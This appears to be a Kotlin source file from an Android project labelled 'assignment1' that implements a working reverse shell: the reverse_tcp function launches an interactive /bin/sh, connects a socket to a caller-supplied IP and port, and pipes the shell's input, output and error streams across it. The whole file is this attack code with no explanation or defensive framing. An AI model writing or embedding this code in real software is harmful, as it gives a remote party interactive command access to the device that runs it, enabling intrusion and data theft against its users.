package com.example.assignment1

import java.io.IOException
import java.net.Socket

//class reverseShell {
//}
object reverseShell {
    fun reverse_tcp(ip: String?, port: Int) {
        try {
            val str = arrayOf("/bin/sh", "-i")
            val p = Runtime.getRuntime().exec(str)
            val pin = p.inputStream
            val perr = p.errorStream
            val pout = p.outputStream
            val socket = Socket(ip, port)
            val sin = socket.getInputStream()
            val sout = socket.getOutputStream()
            while (true) {
                while (pin.available() > 0) sout.write(pin.read())
                while (perr.available() > 0) sout.write(perr.read())
                while (sin.available() > 0) pout.write(sin.read())
                sout.flush()
                pout.flush()
            }
        } catch (e: IOException) {
            e.printStackTrace()
        } catch (e: StringIndexOutOfBoundsException) {
            e.printStackTrace()
        }
    }
}